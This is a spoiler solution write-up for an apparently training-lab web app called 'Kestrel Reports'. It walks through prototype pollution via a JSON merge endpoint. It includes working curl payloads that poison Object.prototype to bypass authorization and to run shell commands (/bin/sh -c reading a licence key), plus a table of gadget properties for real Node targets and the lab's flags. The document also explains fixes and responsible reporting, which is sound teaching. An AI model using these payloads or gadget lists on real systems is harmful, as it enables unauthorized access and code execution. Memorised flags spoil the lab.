# Solution — Kestrel Reports

Full spoilers.

```bash
curl -s -c jar -X POST http://localhost:8088/api/session \
  -H 'Content-Type: application/json' \
  -d '{"email":"analyst@northgate.example","password":"Kestrel-Reports-2026"}'

api() { curl -s -b jar -X "$1" "http://localhost:8088$2" \
          -H 'Content-Type: application/json' ${3:+-d "$3"}; }
```

Establish the baseline — both privileged routes refuse you:

```bash
api GET /api/exports
# {"error":"your context has no exports:read grant"}

api POST /api/reports/RPT-2026-02-REVENUE/render
# {"error":"your context has no reports:render grant"}
```

## Finding the sink

`PATCH /api/preferences` merges arbitrary nested JSON into a stored
object:

```js
function merge(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];
    if (value && typeof value === "object" && !Array.isArray(value)) {
      if (!target[key] || typeof target[key] !== "object") target[key] = {};
      merge(target[key], value);          // ← recurses into __proto__
    } else {
      target[key] = value;                // ← assigns onto Object.prototype
    }
  }
  return target;
}
```

`Object.keys()` on a JSON-parsed body **includes** `__proto__` as an own
enumerable key, because `JSON.parse` creates it as a normal data property
rather than as the accessor a literal would produce. So `target["__proto__"]`
reads the prototype, the recursion continues into it, and the leaf
assignment lands on `Object.prototype` — visible from every object in the
process.

Confirm the primitive before building anything on it:

```bash
api PATCH /api/preferences '{"__proto__":{"kestrelCanary":"yes"}}' > /dev/null
api GET /api/preferences | python3 -m json.tool | grep kestrelCanary || echo "not in own properties"
```

It will not appear in that response — the pollution is on the prototype,
not on your document. That silence is normal, and it is why this class is
missed in testing: **nothing confirms a successful pollution until some
other code reads the property.** Find code that reads a property your
objects do not define.

## Objective 1 — `HxBugLabs{4_m1ss1ng_pr0p3rty_1s_4n_4tt4ck_surf4c3}`

### The gadget

```js
function isAllowed(ctx, permission) {
  const grants = ctx.grants || ROLE_GRANTS[ctx.role] || ROLE_GRANTS.viewer;
  return Array.isArray(grants) && grants.includes(permission);
}
```

and the context it is called with:

```js
return { userId, email, workspaceId, requestId };
```

Neither `grants` nor `role` is ever set on that object. Both reads walk
the prototype chain, which you now control. `ctx.grants` is checked first,
so it is the cleaner target — supply the array directly:

```bash
api PATCH /api/preferences \
  '{"__proto__":{"grants":["reports:read","reports:render","exports:read"]}}' > /dev/null

api GET /api/exports | python3 -m json.tool
```

```json
{
  "exports": [ ... ],
  "note": "full-fidelity export, finance only",
  "exportToken": "HxBugLabs{4_m1ss1ng_pr0p3rty_1s_4n_4tt4ck_surf4c3}"
}
```

`ctx.role` works as well (`{"__proto__":{"role":"finance"}}`) and is worth
trying too — it exercises the second fallback and proves the same point.

### Root cause

Two independent bugs, and both are worth naming separately in a report:

1. **A merge that does not reject dangerous keys.** The fix is one line —
   skip `__proto__`, `constructor` and `prototype` — plus using
   `Object.create(null)` for any bag that holds untrusted keys, or
   `structuredClone`/schema validation at the boundary. `Object.freeze(Object.prototype)`
   at process start is a cheap global backstop.
2. **An authorization decision made by reading an optional property.**
   `ctx.grants || lookup(ctx.role)` is a permissive default wearing a
   security check's clothing. Authorization should be computed from the
   authenticated principal on every call — `grantsFor(session.user)` —
   never read from a mutable object that may or may not carry the field.

The second bug is the one that generalises. Prototype pollution is only
ever as bad as the properties an application reads without defining, so
the interesting question on a real target is always: *what does this code
read that it never writes?*

## Objective 2 — `HxBugLabs{0pt10ns_0r_d3f4ult_1s_4_g4dg3t_ch41n}`

### The gadget chain

The render handler is a stack of the same pattern:

```js
const options   = report.render || {};                      // {} — inherits from Object.prototype
const engine    = options.engine   || RENDER_DEFAULTS.engine;
const baseArgs  = options.baseArgs || RENDER_DEFAULTS.baseArgs;
const extraArgs = options.extraArgs || [];
const argv = [...baseArgs, ...extraArgs, report.id];

execFile(engine, argv, { timeout: RENDER_DEFAULTS.timeoutMs }, ...);
```

No report in the seed defines `render`, so `options` is a plain `{}` and
**every one of those three reads resolves through the prototype**. You
control the binary and its whole argument vector.

### Exploiting it

`execFile` does not use a shell, so `;` and `|` in an argument mean
nothing. Do not fight that — make the binary itself a shell:

```bash
api PATCH /api/preferences '{"__proto__":{
  "grants":["reports:read","reports:render","exports:read"],
  "engine":"/bin/sh",
  "baseArgs":["-c","cat /opt/kestrel/licence.key; id"]
}}' > /dev/null

api POST /api/reports/RPT-2026-02-REVENUE/render | python3 -m json.tool
```

```json
{
  "engine": "/bin/sh",
  "argv": ["-c", "cat /opt/kestrel/licence.key; id", "RPT-2026-02-REVENUE"],
  "exitCode": 0,
  "stdout": "workspace=northgate\nlicence=HxBugLabs{0pt10ns_0r_d3f4ult_1s_4_g4dg3t_ch41n}\nseats=25\nuid=100(app) gid=101(app) groups=101(app)\n"
}
```

The report id ends up as a trailing argument, which `sh -c` assigns to
`$0` and ignores. `stdout` comes back in the response, so the execution is
not blind.

### Root cause

**`options.x || DEFAULT` is a gadget wherever `options` is not
null-prototype.** The application does not have to contain a single unsafe
`eval`, template engine or deserializer for pollution to reach command
execution — a fallback chain is enough, and fallback chains are
everywhere.

Where to look for these on real Node targets, in the order that pays:

| Read | Turns into |
| --- | --- |
| `options.shell` on `spawn`/`exec` | shell interpretation of arguments |
| `options.env` / `NODE_OPTIONS` | `--require` of an attacker path |
| `options.cwd`, an engine or binary path | arbitrary process |
| `outputFunctionName`, `escapeFunction`, `client` (EJS) | template-compile RCE — **version dependent**, fixed in current EJS |
| `pug`'s `self`, `lodash.template`'s `sourceURL` | same shape, same caveat |
| `options.isAdmin`, `.role`, `.grants` | authorization bypass |
| `options.status`, `.contentType`, `.headers` | response splitting, cache poisoning |

The library gadgets go stale — the EJS `outputFunctionName` chain does not
work on a current EJS, which is exactly why this lab does not use it. The
**application's own** fallback reads never go stale, and on a real target
they are the ones nobody has audited.

### Finding pollution when you cannot read the source

The application here is open; a real one is not. The reliable black-box
process:

1. **Find a merge sink.** Any endpoint accepting nested JSON: preferences,
   profile, settings, filters, bulk import, GraphQL input objects.
2. **Pollute a property with an observable effect.** The classic is
   `{"__proto__":{"status":500}}` or `{"__proto__":{"toString":"x"}}` —
   something that makes an *unrelated* endpoint behave differently. That
   is your detector.
3. **Then hunt the gadget** with the table above, one property at a time,
   watching an unrelated endpoint after each attempt.
4. **Clean up.** Pollution is process-global — it affects every other
   user of that instance. On a real program, pollute the narrowest
   property that proves the point, say so in the report, and tell the
   team to restart the process.

## Notes for the report

One submission, chained, with the RCE as the headline and the merge as
the root cause. Structure that survives triage:

> An analyst-level account can set arbitrary properties on
> `Object.prototype` through `PATCH /api/preferences`. Two consequences
> were demonstrated: (1) `exports:read` authorization bypass via
> `ctx.grants`, and (2) arbitrary command execution as the application
> user via the report renderer's `options.engine` / `options.baseArgs`
> fallbacks. Proof of execution attached; no files were modified.

Say explicitly what you ran (`cat` a licence file and `id`), that you
changed nothing, and that the pollution is process-global so the instance
should be restarted. A prototype-pollution RCE report that does not
mention the blast radius reads as reckless even when the testing was not.
